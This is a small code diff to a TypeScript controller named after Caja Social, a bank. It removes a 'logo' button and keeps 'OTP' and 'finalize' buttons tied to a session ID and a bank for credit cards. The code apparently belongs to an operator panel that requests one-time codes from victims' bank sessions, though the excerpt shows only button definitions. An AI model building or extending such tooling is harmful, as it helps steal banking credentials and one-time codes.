@@ -507,7 +507,6 @@ export class CajaSocialController {
       // Se retornan los botones para TC
       return [
         [
-          { text: '🪪 LG', callback_data: `logo:${sessionId};${bank}` },
           { text: '📱 OTP', callback_data: `sol_otp:${sessionId};${bank}` },
           { text: '✅ FIN', callback_data: `sol_finalizar:${sessionId};${bank}` },
         ],
